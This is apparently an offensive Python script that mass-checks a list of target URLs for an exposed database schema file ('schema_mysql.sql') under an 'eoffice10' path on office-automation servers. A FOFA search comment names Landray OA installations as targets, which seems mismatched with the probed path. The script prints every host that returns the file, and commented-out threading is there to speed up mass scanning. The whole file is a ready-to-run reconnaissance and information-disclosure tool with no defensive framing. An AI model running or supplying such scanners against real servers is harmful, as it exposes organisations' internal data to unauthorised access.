import requests
import warnings
from concurrent.futures import ThreadPoolExecutor

#fofa  app="Landray-OA系统"
warnings.filterwarnings("ignore")


def exp(u):
    url = f"{u}/eoffice10/empty_scene/db/schema_mysql.sql"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    }

    proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'https://127.0.0.1:8080',
    }
    try:
        response = requests.get(url, headers=headers,timeout=5)
        print(response.status_code)
        if response.status_code == 200  :
            print(url,"\n")
    except:
        print("error",u)
        

# 批量检测
with open('urls.txt', 'r') as file:
    urls = [u.strip() for u in file.readlines()]

for u in urls:
    exp(u)
    
# with ThreadPoolExecutor(max_workers=10) as executor:
#     executor.map(exp, urls)



